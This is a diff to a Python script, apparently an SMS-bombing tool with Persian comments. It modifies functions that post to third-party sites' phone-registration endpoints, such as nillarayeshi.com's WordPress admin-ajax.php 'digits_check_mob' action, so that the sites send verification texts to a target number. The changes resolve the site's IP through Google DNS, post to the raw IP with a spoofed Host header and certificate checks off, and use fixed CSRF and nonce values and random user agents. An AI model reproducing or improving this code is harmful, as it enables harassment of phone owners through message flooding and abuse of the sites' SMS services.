@@ -103,21 +103,22 @@ def SibApp(phone):
         print(f'{r}[!] SibApp Exception: {e}{a}')
         return False
 
-import httpx
-
-# تعریف کلاینت با DNS سفارشی
-client = httpx.Client(dns="8.8.8.8")  # DNS گوگل
-
+import requests, re, random, socket, dns.resolver
 
 def nillarayeshi(phone):
     try:
-        session = requests.Session()
+        # --- تنظیم DNS گوگل برای resolve کردن ---
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = ["8.8.8.8"]  # DNS گوگل
+        answer = resolver.resolve("nillarayeshi.com", "A")
+        ip = answer[0].to_text()  # آی‌پی واقعی سایت از DNS گوگل
+
+        # --- آماده‌سازی شماره ---
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        
-        # استفاده از مقادیر جدید
+
         csrf = "34baf6a4f4"
         nonce = "34baf6a4f4"
-        
+
         payload = {
             "action": "digits_check_mob",
             "countrycode": "+98",
@@ -131,7 +132,7 @@ def nillarayeshi(phone):
             "digits": "1",
             "json": "1",
             "whatsapp": "0",
-            "digits_reg_name": "name1234",  # تغییر به name1234
+            "digits_reg_name": "name1234",
             "digregcode": "+98",
             "digits_reg_mail": formatted_phone,
             "digregscode2": "+98",
@@ -142,7 +143,7 @@ def nillarayeshi(phone):
             "dig_reg_mail": "",
             "dig_nounce": nonce
         }
-        
+
         headers = {
             "User-Agent": random.choice(user_agents),
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -150,16 +151,19 @@ def nillarayeshi(phone):
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://nillarayeshi.com",
             "Referer": "https://nillarayeshi.com/",
+            "Host": "nillarayeshi.com",   # باید همون دامنه بمونه
         }
-        
-        response = session.post(
-            "https://nillarayeshi.com/wp-admin/admin-ajax.php",
+
+        url = f"https://{ip}/wp-admin/admin-ajax.php"
+
+        response = requests.post(
+            url,
             data=payload,
             headers=headers,
             timeout=10,
             verify=False
         )
-        
+
         if response.status_code == 200:
             if "code" in response.text:
                 print(f'{g}(nillarayeshi) SMS Sent Successfully!{a}')
@@ -170,11 +174,10 @@ def nillarayeshi(phone):
         else:
             print(f'{r}[-] nillarayeshi HTTP Error: {response.status_code}{a}')
             return False
-            
+
     except Exception as e:
         print(f"{r}[!] nillarayeshi Exception: {e}{a}")
         return False
-
 # ==========================
 # لیست سرویس‌ها
 # ==========================
